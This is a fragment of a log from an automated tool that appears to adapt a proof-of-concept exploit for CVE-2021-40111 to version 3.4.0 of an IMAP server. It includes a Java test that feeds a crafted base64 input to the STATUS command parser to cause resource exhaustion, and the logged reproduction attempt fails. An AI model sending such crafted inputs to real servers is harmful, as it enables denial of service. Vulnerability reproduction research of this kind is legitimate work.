    public void fuzzingInputShouldNotLeadToOutOfMemoryException() {
        String base64Input = "MiAgKH8MSU4kQiBOJEIgICMAf15Df39/f39/f39/f39/f39/f39/f39/f0NDRTogP19GbT8JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCT0NAAAAAAAAAD0/TkNPAAAAAAhlAAAAAAA=";
        byte[] bytes = Base64.getDecoder().decode(base64Input);

        assertThatThrownBy(() -> {
            StatusCommandParserChild parser = new StatusCommandParserChild(new UnpooledStatusResponseFactory());
            parser.decode(new ImapRequestStreamLineReader(new ByteArrayInputStream(bytes),
                    new ByteArrayInputStream(new byte[0]), "AEA", new FakeImapSession()), "AEA", new FakeImapSession());
        }).isInstanceOf(DecodingException.class);
    }
}

class StatusCommandParserChild extends StatusCommandParser {
    public StatusCommandParserChild(UnpooledStatusResponseFactory statusResponseFactory) {
        super(statusResponseFactory);
    }

    public void decode(ImapRequestLineReader request, String tag, ImapSession session) throws DecodingException {
        super.decode(ImapCommand.anyStateCommand("STATUS"), request, tag, session);
    }
}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2021-40111/3.4.0/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2021-40111 on version 3.4.0...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'org.junit.runners.model.TestTimedOutException'[0m
[91m[Executor] Reproduction result: Failure[0m
None
[Adapt] âœ— No result returned.
[91m[Adapter] Adaptation failed for 3.4.0[0m

[Executor] â–¶ Summary of return codes:
  - Version 3.4.0: âœ— Failed (exit code 1)
